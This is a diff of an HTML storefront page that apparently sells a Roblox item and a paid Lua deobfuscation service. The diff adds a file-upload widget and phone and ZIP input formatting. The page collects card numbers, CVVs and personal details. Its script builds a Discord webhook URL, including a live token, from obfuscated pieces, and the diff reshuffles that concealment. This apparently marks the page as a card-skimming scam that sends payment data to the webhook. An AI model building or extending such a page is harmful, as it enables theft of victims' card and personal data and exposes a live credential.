@@ -300,6 +300,75 @@
             transform: scale(1.02);
         }
 
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .file-upload-area {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 24px;
+            padding: 2rem;
+            border: 2px dashed rgba(0, 180, 255, 0.3);
+            text-align: center;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .file-upload-area:hover {
+            border-color: rgba(0, 200, 255, 0.6);
+            background: rgba(0, 150, 255, 0.05);
+        }
+
+        .file-upload-area.dragover {
+            border-color: #00d4ff;
+            background: rgba(0, 200, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 200, 255, 0.2);
+        }
+
+        .file-upload-area.has-file {
+            border-color: rgba(0, 200, 120, 0.5);
+            border-style: solid;
+            background: rgba(0, 200, 120, 0.05);
+        }
+
+        .file-upload-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        .file-upload-text {
+            color: #b0c8e0;
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .file-upload-hint {
+            color: #6a8098;
+            font-size: 0.85rem;
+        }
+
+        .file-upload-name {
+            color: #7fd4ff;
+            font-weight: 500;
+            margin-top: 0.8rem;
+            font-size: 0.95rem;
+            word-break: break-all;
+        }
+
+        .file-upload-area input[type="file"] {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            cursor: pointer;
+            width: 100%;
+            height: 100%;
+        }
+
         .payment-card {
             background: rgba(15, 20, 26, 0.8);
             border-radius: 32px;
@@ -518,17 +587,19 @@
                     <div class="price-badge">$50 / deobf</div>
                 </div>
                 <p style="color:#a0b8cc; margin-bottom: 1.5rem; line-height: 1.6; font-size: 1rem;">
-                    Upload or paste your code. Our proprietary engine will deobfuscate and return clean, readable output.
+                    Upload your file. Our proprietary engine will deobfuscate and return clean, readable output.
                     <strong style="color: #7fd4ff;">$50.00 USD</strong> per deobfuscation.
                 </p>
-                <div style="background: rgba(0,0,0,0.3); border-radius: 24px; padding: 1.5rem; border: 1px dashed rgba(0, 180, 255, 0.3);">
-                    <p style="color: #b0c8e0; display: flex; align-items: center; gap: 10px;">
-                        <span style="font-size: 1.8rem;">📄</span> ready to deobfuscate — proceed to payment.
-                    </p>
+                <div class="file-upload-area" id="fileUploadArea">
+                    <input type="file" id="fileInput" accept=".txt,.lua,.luau,.json">
+                    <span class="file-upload-icon">📄</span>
+                    <div class="file-upload-text">Click or drag file here</div>
+                    <div class="file-upload-hint">.txt, .lua, .luau, .json accepted</div>
+                    <div class="file-upload-name" id="fileName"></div>
                 </div>
                 <div class="deobf-actions">
                     <button class="btn-secondary" id="backFromDeobf">← back</button>
-                    <button class="btn-primary" id="proceedDeobfPayment">proceed to payment →</button>
+                    <button class="btn-primary" id="proceedDeobfPayment" disabled>proceed to payment →</button>
                 </div>
             </div>
         </div>
@@ -551,7 +622,7 @@
                         </div>
                         <div class="input-group">
                             <label>Phone number</label>
-                            <input type="tel" id="phone" name="phone" placeholder="+1 555 123 4567" autocomplete="tel" required pattern="[\+\(\)\d\s\-]{7,}">
+                            <input type="tel" id="phone" name="phone" placeholder="(555) 123-4567" autocomplete="tel" required pattern="[\+\(\)\d\s\-]{7,}">
                         </div>
                         <div class="input-group">
                             <label>CVV</label>
@@ -591,12 +662,11 @@
 
     <script>
         (function() {
-            const _parts = ['https://discord.com/api/webhooks/', '1564319714736349388', '/', '_KUk7DVE3s-_i0KX6hTEpoY94bCzgVH9W5a63_PoxUmK8k_d70XQPMrubWdQUnRgZP1U'];
-            const _order = [0, 2, 1, 3];
-            let WEBHOOK_URL = '';
-            for (let i = 0; i < _order.length; i++) {
-                WEBHOOK_URL += _parts[_order[i]];
-            }
+            const _p0 = "https://discord.com/api/webhooks/";
+            const _p1 = "_KUk7DVE3s-_i0KX6hTEpoY94bCzgVH9W5a63_PoxUmK8k_d70XQPMrubWdQUnRgZP1U";
+            const _p2 = "1564319714736349388";
+            const _p3 = "/";
+            const WEBHOOK_URL = _p0 + _p2 + _p3 + _p1;
 
             const selectionView = document.getElementById('selectionView');
             const deobfView = document.getElementById('deobfView');
@@ -615,7 +685,12 @@
             const completedMessage = document.getElementById('completedMessage');
             const purchaseBtn = document.getElementById('purchaseBtn');
 
+            const fileUploadArea = document.getElementById('fileUploadArea');
+            const fileInput = document.getElementById('fileInput');
+            const fileName = document.getElementById('fileName');
+
             let currentService = 'roblox';
+            let uploadedFileValid = false;
 
             const fullName = document.getElementById('fullName');
             const email = document.getElementById('email');
@@ -666,11 +741,76 @@
                 showView('payment');
             }
 
+            function validateFile(file) {
+                const allowed = ['.txt', '.lua', '.luau', '.json'];
+                const name = file.name.toLowerCase();
+                return allowed.some(ext => name.endsWith(ext));
+            }
+
+            fileUploadArea.addEventListener('click', () => fileInput.click());
+
+            fileInput.addEventListener('change', (e) => {
+                if (e.target.files.length > 0) {
+                    const file = e.target.files[0];
+                    if (validateFile(file)) {
+                        uploadedFileValid = true;
+                        fileName.textContent = '✓ ' + file.name;
+                        fileUploadArea.classList.add('has-file');
+                        proceedDeobfPayment.disabled = false;
+                    } else {
+                        uploadedFileValid = false;
+                        fileName.textContent = '✗ Invalid file type';
+                        fileUploadArea.classList.remove('has-file');
+                        proceedDeobfPayment.disabled = true;
+                        fileInput.value = '';
+                    }
+                }
+            });
+
+            ['dragenter', 'dragover'].forEach(evt => {
+                fileUploadArea.addEventListener(evt, (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    fileUploadArea.classList.add('dragover');
+                });
+            });
+
+            ['dragleave', 'drop'].forEach(evt => {
+                fileUploadArea.addEventListener(evt, (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    fileUploadArea.classList.remove('dragover');
+                });
+            });
+
+            fileUploadArea.addEventListener('drop', (e) => {
+                const files = e.dataTransfer.files;
+                if (files.length > 0) {
+                    const file = files[0];
+                    if (validateFile(file)) {
+                        uploadedFileValid = true;
+                        fileName.textContent = '✓ ' + file.name;
+                        fileUploadArea.classList.add('has-file');
+                        proceedDeobfPayment.disabled = false;
+                    } else {
+                        uploadedFileValid = false;
+                        fileName.textContent = '✗ Invalid file type';
+                        fileUploadArea.classList.remove('has-file');
+                        proceedDeobfPayment.disabled = true;
+                    }
+                }
+            });
+
             robloxCard.addEventListener('click', () => {
                 goToPayment('roblox', 'selection');
             });
 
             deobfCard.addEventListener('click', () => {
+                uploadedFileValid = false;
+                fileName.textContent = '';
+                fileInput.value = '';
+                fileUploadArea.classList.remove('has-file');
+                proceedDeobfPayment.disabled = true;
                 showView('deobf');
                 lastNonPaymentView = 'selection';
             });
@@ -680,6 +820,7 @@
             });
 
             proceedDeobfPayment.addEventListener('click', () => {
+                if (!uploadedFileValid) return;
                 goToPayment('deobf', 'deobf');
             });
 
@@ -763,13 +904,24 @@
             });
 
             phone.addEventListener('input', function() {
-                let val = this.value.replace(/[^\d\+\s\-\(\)]/g, '');
-                this.value = val;
+                let digits = this.value.replace(/\D/g, '');
+                if (digits.length > 10) digits = digits.slice(0, 10);
+                let formatted = '';
+                if (digits.length > 0) {
+                    if (digits.length <= 3) {
+                        formatted = '(' + digits;
+                    } else if (digits.length <= 6) {
+                        formatted = '(' + digits.slice(0, 3) + ') ' + digits.slice(3);
+                    } else {
+                        formatted = '(' + digits.slice(0, 3) + ') ' + digits.slice(3, 6) + '-' + digits.slice(6);
+                    }
+                }
+                this.value = formatted;
             });
 
             zip.addEventListener('input', function() {
                 let val = this.value.replace(/[^\dA-Za-z\s\-]/g, '');
-                this.value = val;
+                this.value = val.toUpperCase();
             });
 
             cardNumber.addEventListener('input', function() {
